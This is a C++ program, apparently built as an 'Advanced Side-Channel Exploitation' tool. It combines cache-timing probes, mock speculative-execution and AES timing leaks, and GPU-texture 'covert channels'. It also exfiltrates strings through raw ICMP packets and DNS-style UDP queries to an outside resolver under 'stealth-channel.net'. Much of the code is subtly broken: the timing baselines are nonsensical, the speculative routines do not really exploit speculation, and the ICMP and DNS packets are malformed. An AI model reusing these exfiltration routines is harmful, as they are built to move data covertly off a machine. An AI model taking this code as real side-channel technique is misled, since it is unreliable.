#include <emmintrin.h>
#include <x86intrin.h>
#include <thread>
#include <iostream>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <GL/glew.h>
#include <GLFW/glfw3.h>
#include <arpa/inet.h>
#include <openssl/aes.h>
#include <random>
#include <mutex>
#include <cmath>
#include <iomanip>
#include <fstream>
#include <atomic>
#include <chrono>

#define PAGE_SIZE 4096
#define CACHE_THRESHOLD 150
#define WIDTH 1024
#define HEIGHT 768

volatile char sharedCryptoBuffer[PAGE_SIZE];
std::mutex cryptoMutex;
std::atomic<bool> running(true);

inline uint64_t rdtscp() {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "%rcx");
    return ((uint64_t)hi << 32) | lo;
}

void matrixTransformAES(unsigned char *data, size_t size) {
    const int matrix[4][4] = {
        {1, 2, 3, 4},
        {4, 3, 2, 1},
        {5, 6, 7, 8},
        {8, 7, 6, 5},
    };
    for (size_t i = 0; i < size; i += 4) {
        for (int j = 0; j < 4; ++j) {
            data[i + j] ^= matrix[j][i % 4];
        }
    }
}

void primeProbeTiming() {
    uint64_t baseline = 0;

    for (int i = 0; i < 10; ++i) {
        _mm_clflush(sharedCryptoBuffer);
        baseline += rdtscp() - (_mm_clflush(sharedCryptoBuffer), rdtscp());
    }
    baseline /= 10;

    while (true) {
        std::this_thread::sleep_for(std::chrono::microseconds(100));
        uint64_t start = rdtscp();
        (void)*sharedCryptoBuffer;
        uint64_t elapsed = rdtscp() - start;

        if (elapsed > baseline + CACHE_THRESHOLD) {
            std::cout << "[Timing Spike] Cycles: " << elapsed << " | Entropy: "
                      << std::hex << (elapsed ^ baseline) << "\n";
        }
    }
}

void cryptographicLeakageSim() {
    AES_KEY aesKey;
    unsigned char key[16];
    unsigned char plaintext[16] = {0};
    unsigned char ciphertext[16];

    std::generate(std::begin(key), std::end(key), std::rand);
    AES_set_encrypt_key(key, 128, &aesKey);

    while (true) {
        std::lock_guard<std::mutex> lock(cryptoMutex);
        AES_encrypt(plaintext, ciphertext, &aesKey);

        uint64_t timing = rdtscp();
        _mm_clflush(sharedCryptoBuffer);
        timing = rdtscp() - timing;

        if (timing > CACHE_THRESHOLD) {
            std::cout << "[CryptoLeak] Key-Dependent Timing Observed: " << timing << " cycles.\n";
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void gpuCovertExfiltration(GLuint texture, const std::string& data) {
    glBindTexture(GL_TEXTURE_2D, texture);
    std::vector<float> pixelData(data.size() * 4, 0.0f);

    for (size_t i = 0; i < data.size(); ++i) {
        pixelData[i * 4] = (float)(data[i] ^ 0xAA) / 255.0f;
        pixelData[i * 4 + 1] = (float)(data[i] ^ 0x55) / 255.0f;
        pixelData[i * 4 + 2] = (float)(~data[i]) / 255.0f;
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 1024, 1024, GL_RGBA, GL_FLOAT, pixelData.data());
    std::cout << "[GPU] Covert channel active on texture resource.\n";
}

void speculativeExecutionLeak() {
    volatile char dummy[PAGE_SIZE];

    for (int i = 0; i < 100; ++i) {
        if (_mm_clflush(dummy), dummy[0] > 0) {
            std::cout << "[SpecLeak] Speculative Read Triggered.\n";
        }
    }
}

void exfiltrateICMP(const std::string& data) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        std::cerr << "[Error] Failed to create ICMP socket.\n";
        return;
    }

    struct sockaddr_in dest = {};
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, "8.8.8.8", &dest.sin_addr);

    std::string packet = "\x08\x00";
    packet += data;

    sendto(sock, packet.c_str(), packet.size(), 0, (struct sockaddr*)&dest, sizeof(dest));
    close(sock);

    std::cout << "[CovertExfil] Data exfiltrated via ICMP.\n";
}

void pixelShaderExploit(GLuint texture, const std::vector<float> &data) {
    glBindTexture(GL_TEXTURE_2D, texture);

    std::vector<float> pixelData = data;
    for (size_t i = 0; i < data.size(); i++) {
        pixelData[i] = fmod(data[i] * sin(data[i] * M_PI), 1.0f);
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 512, 512, GL_RGBA, GL_FLOAT, pixelData.data());
    glGenerateMipmap(GL_TEXTURE_2D);
    std::cout << "[Pixel Shader] Covert data injection complete.\n";
}

void speculativeExecutionAttack() {
    volatile char dummy[PAGE_SIZE];
    volatile char secret[PAGE_SIZE] = "HighlySensitiveData12345";

    for (int i = 0; i < 100; ++i) {
        if (_mm_clflush(dummy), dummy[0] > 0) {
            volatile char temp = secret[i % PAGE_SIZE];
            if (temp) {
                std::cout << "[Speculative] Leaked Byte: " << temp << "\n";
            }
        }
    }
}

void chaoticICMP(const std::string &data) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;

    sockaddr_in dest = {};
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, "8.8.8.8", &dest.sin_addr);

    std::string packet = "\x08\x00" + data;

    for (char c : data) {
        char chaos = (c ^ 0x5A) + (c % 7);
        packet.push_back(chaos);
    }

    sendto(sock, packet.c_str(), packet.size(), 0, (sockaddr *)&dest, sizeof(dest));
    close(sock);
    std::cout << "[ICMP] Exfiltrated.\n";
}

float chaoticFunction(float input) {
    return sin(input * 3.14159) * tanh(input) + cos(input / 0.001);
}

void chaoticCryptoLeakage(GLuint texture, unsigned char* secret, size_t length) {
    glBindTexture(GL_TEXTURE_2D, texture);

    std::vector<float> chaoticPixels(WIDTH * HEIGHT * 4);
    for (size_t i = 0; i < WIDTH * HEIGHT; i++) {
        chaoticPixels[i] = chaoticFunction(secret[i % length]) * 0.5f + 0.5f;
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, WIDTH, HEIGHT, GL_RGBA, GL_FLOAT, chaoticPixels.data());
    glGenerateMipmap(GL_TEXTURE_2D);
}

void advancedSpeculativeLeak() {
    volatile char dummy[PAGE_SIZE];
    volatile char secret[PAGE_SIZE] = "AdvancedSensitiveLeakagePayload";
    std::vector<uint64_t> timingResults;

    for (int i = 0; i < 1000; ++i) {
        _mm_clflush(dummy);
        uint64_t start = rdtscp();
        volatile char temp = secret[i % PAGE_SIZE];
        uint64_t elapsed = rdtscp() - start;
        if (elapsed > CACHE_THRESHOLD) {
            timingResults.push_back(elapsed ^ 0xDEADBEEF);
        }
    }

    std::ofstream leakFile("timing_leak.log");
    for (auto& val : timingResults) {
        leakFile << val << "\n";
    }
    leakFile.close();
}

void gpuShadingExploitation(GLuint texture, unsigned char* secret) {
    std::vector<float> shaderData(WIDTH * HEIGHT);
    for (size_t i = 0; i < WIDTH * HEIGHT; i++) {
        shaderData[i] = fmod(secret[i % PAGE_SIZE] * chaoticFunction(i), 1.0f);
    }

    glBindTexture(GL_TEXTURE_2D, texture);
    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, WIDTH, HEIGHT, GL_RGBA, GL_FLOAT, shaderData.data());
    glGenerateMipmap(GL_TEXTURE_2D);
    std::cout << "[Shader Exploit] Injected covert data.\n";
}

void timingNoiseInjection() {
    while (running) {
        volatile uint64_t dummyVal = rdtscp() ^ (uint64_t)(random() % PAGE_SIZE);
        if (dummyVal % 2 == 0) {
            _mm_clflush(sharedCryptoBuffer);
        }
        std::this_thread::sleep_for(std::chrono::microseconds(10));
    }
}

GLuint createTexture(int width, int height) {
    GLuint texture;
    glGenTextures(1, &texture);
    glBindTexture(GL_TEXTURE_2D, texture);
    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA32F, width, height, 0, GL_RGBA, GL_FLOAT, nullptr);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
    return texture;
}

const char* vertexShaderSource = R"(
#version 330 core
layout(location = 0) in vec3 aPos;
layout(location = 1) in vec2 aTexCoord;
out vec2 TexCoord;
void main() {
    gl_Position = vec4(aPos, 1.0);
    TexCoord = aTexCoord;
}
)";

const char* fragmentShaderSource = R"(
#version 330 core
out vec4 FragColor;
in vec2 TexCoord;
uniform sampler2D texture1;
void main() {
    vec4 texColor = texture(texture1, TexCoord);
    float manipulatedValue = sin(texColor.r * 3.14159) * tanh(texColor.g) + cos(texColor.b / 0.001);
    FragColor = vec4(manipulatedValue, manipulatedValue, manipulatedValue, 1.0);
}
)";

const char* advancedFragmentShaderSource = R"(
#version 330 core
out vec4 FragColor;
in vec2 TexCoord;
uniform sampler2D texture1;

float chaoticFunction(float input) {
    return sin(input * 3.14159) * tanh(input) + cos(input / 0.001);
}

void main() {
    vec4 texColor = texture(texture1, TexCoord);
    float manipulatedValue = chaoticFunction(texColor.r) * chaoticFunction(texColor.g);
    float advancedValue = manipulatedValue * abs(sin(TexCoord.x * TexCoord.y));
    FragColor = vec4(advancedValue, advancedValue, advancedValue, 1.0);
}
)";

const char* pixelFragmentShaderSource = R"(
#version 330 core
out vec4 FragColor;
in vec2 TexCoord;
uniform sampler2D texture1;
void main() {
    vec4 texColor = texture(texture1, TexCoord);
    float pixelValue = texColor.r * texColor.g * texColor.b;
    FragColor = vec4(pixelValue, pixelValue, pixelValue, 1.0);
}
)";

const char* advancedFragmentShader = R"(
    #version 450 core
    layout(location = 0) out vec4 fragColor;

    uniform sampler2D sharedTexture;
    uniform vec2 resolution;
    uniform float dataOffset;

    void main() {
        vec2 uv = gl_FragCoord.xy / resolution;
        vec4 pixelData = texture(sharedTexture, uv);
        pixelData.r += dataOffset;
        pixelData.g -= dataOffset * 0.5;
        pixelData.b += mod(dataOffset, 0.2);
        fragColor = pixelData;
    }
)";

GLuint compileShaders(const char* fragmentShaderSrc) {
    GLuint vertexShader = glCreateShader(GL_VERTEX_SHADER);
    glShaderSource(vertexShader, 1, &vertexShaderSource, nullptr);
    glCompileShader(vertexShader);

    GLuint fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
    glShaderSource(fragmentShader, 1, &fragmentShaderSrc, nullptr);
    glCompileShader(fragmentShader);

    GLuint shaderProgram = glCreateProgram();
    glAttachShader(shaderProgram, vertexShader);
    glAttachShader(shaderProgram, fragmentShader);
    glLinkProgram(shaderProgram);

    glDeleteShader(vertexShader);
    glDeleteShader(fragmentShader);

    return shaderProgram;
}

void advancedPixelShaderExploit(GLuint texture, const std::vector<float> &data) {
    glBindTexture(GL_TEXTURE_2D, texture);

    std::vector<float> pixelData = data;
    for (size_t i = 0; i < data.size(); i++) {
        pixelData[i] = fmod(data[i] * sin(data[i] * M_PI), 1.0f);
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 512, 512, GL_RGBA, GL_FLOAT, pixelData.data());
    glGenerateMipmap(GL_TEXTURE_2D);
    std::cout << "[Advanced Pixel Shader] Covert data injection complete.\n";
}

void advancedGPUShadingExploitation(GLuint texture, unsigned char* secret) {
    std::vector<float> shaderData(WIDTH * HEIGHT);
    for (size_t i = 0; i < WIDTH * HEIGHT; i++) {
        shaderData[i] = fmod(secret[i % PAGE_SIZE] * chaoticFunction(i), 1.0f);
    }

    glBindTexture(GL_TEXTURE_2D, texture);
    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, WIDTH, HEIGHT, GL_RGBA, GL_FLOAT, shaderData.data());
    glGenerateMipmap(GL_TEXTURE_2D);
    std::cout << "[Advanced Shader Exploit] Injected covert data.\n";
}

void monitorCryptoBuffer() {
    uint64_t baseline = 0, noiseThreshold = 200;

    for (int i = 0; i < 10; ++i) {
        _mm_clflush(sharedCryptoBuffer);
        baseline += rdtscp() - (_mm_clflush(sharedCryptoBuffer), rdtscp());
    }
    baseline /= 10;

    while (true) {
        _mm_clflush(sharedCryptoBuffer);
        auto start = rdtscp();
        (void)*sharedCryptoBuffer;
        auto timing = rdtscp() - start;

        if (timing > baseline + noiseThreshold) {
            std::cout << "[Cache Monitor] Detected cryptographic operation! Timing: " << timing << " cycles\n";
        }
        std::this_thread::sleep_for(std::chrono::microseconds(50));
    }
}

GLuint createSharedTextureResource(int width, int height) {
    GLuint texture;
    glGenTextures(1, &texture);
    glBindTexture(GL_TEXTURE_2D, texture);
    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA32F, width, height, 0, GL_RGBA, GL_FLOAT, nullptr);

    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

    std::cout << "[Shared Resource] Texture created for GPU exploitation.\n";
    return texture;
}

void encodeDataInPixels(GLuint texture, const std::string& data) {
    glBindTexture(GL_TEXTURE_2D, texture);
    std::vector<float> pixelData(2048 * 2048 * 4, 0.0f);

    for (size_t i = 0; i < data.size(); ++i) {
        pixelData[i * 4] = (float)(data[i]) / 255.0f;
        pixelData[i * 4 + 1] = (float)(data[i] ^ 0xAA) / 255.0f;
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 2048, 2048, GL_RGBA, GL_FLOAT, pixelData.data());
    std::cout << "[Pixel Encoding] Data encoded into GPU texture.\n";
}

void exfiltrateDataOverDNS(const std::string& data) {
    std::string domain = data + ".stealth-channel.net";
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        std::cerr << "[Error] Failed to connect.\n";
        return;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &serverAddr.sin_addr);

    sendto(sock, domain.c_str(), domain.size(), 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    std::cout << "[Covert Channel] Data exfiltrated via DNS: " << domain << "\n";
    close(sock);
}

int main() {
    std::thread timingThread(primeProbeTiming);
    std::thread cryptoThread(cryptographicLeakageSim);
    std::thread specThread(speculativeExecutionLeak);
    std::thread noiseThread(timingNoiseInjection);
    std::thread speculativeThread(advancedSpeculativeLeak);
    std::thread monitorThread(monitorCryptoBuffer);

    if (!glfwInit()) {
        std::cerr << "[Error] GLFW Initialization Failed.\n";
        return -1;
    }

    GLFWwindow* window = glfwCreateWindow(WIDTH, HEIGHT, "Advanced Side-Channel Exploitation", nullptr, nullptr);
    if (!window) {
        std::cerr << "[Error] Window Creation Failed.\n";
        glfwTerminate();
        return -1;
    }

    glfwMakeContextCurrent(window);
    glewInit();

    GLuint texture = createTexture(WIDTH, HEIGHT);
    unsigned char secretData[] = "ChaoticPixelManipulationPayload";

    GLuint shaderProgram = compileShaders(fragmentShaderSource);
    GLuint advancedShaderProgram = compileShaders(advancedFragmentShaderSource);
    GLuint pixelShaderProgram = compileShaders(pixelFragmentShaderSource);
    GLuint advancedFragmentShaderProgram = compileShaders(advancedFragmentShader);

    GLuint sharedTexture = createSharedTextureResource(2048, 2048);

    while (!glfwWindowShouldClose(window)) {
        gpuCovertExfiltration(texture, "EncryptedData123");
        exfiltrateICMP("SensitiveTimingData");
        chaoticCryptoLeakage(texture, secretData, sizeof(secretData));
        gpuShadingExploitation(texture, secretData);
        pixelShaderExploit(texture, {0.1f, 0.2f, 0.3f});
        chaoticICMP("TimingSensitiveData");

        glUseProgram(shaderProgram);
        glClear(GL_COLOR_BUFFER_BIT);
        glDrawArrays(GL_TRIANGLES, 0, 3);

        glUseProgram(advancedShaderProgram);
        glClear(GL_COLOR_BUFFER_BIT);
        glDrawArrays(GL_TRIANGLES, 0, 3);

        glUseProgram(pixelShaderProgram);
        glClear(GL_COLOR_BUFFER_BIT);
        glDrawArrays(GL_TRIANGLES, 0, 3);

        advancedPixelShaderExploit(texture, {0.1f, 0.2f, 0.3f});
        advancedGPUShadingExploitation(texture, secretData);

        encodeDataInPixels(sharedTexture, "SensitiveData123");
        exfiltrateDataOverDNS("EncryptedTimingData");

        glfwSwapBuffers(window);
        glfwPollEvents();
    }

    running = false;
    timingThread.join();
    cryptoThread.join();
    specThread.join();
    noiseThread.join();
    speculativeThread.join();
    monitorThread.join();

    glfwDestroyWindow(window);
    glfwTerminate();
    return 0;
}
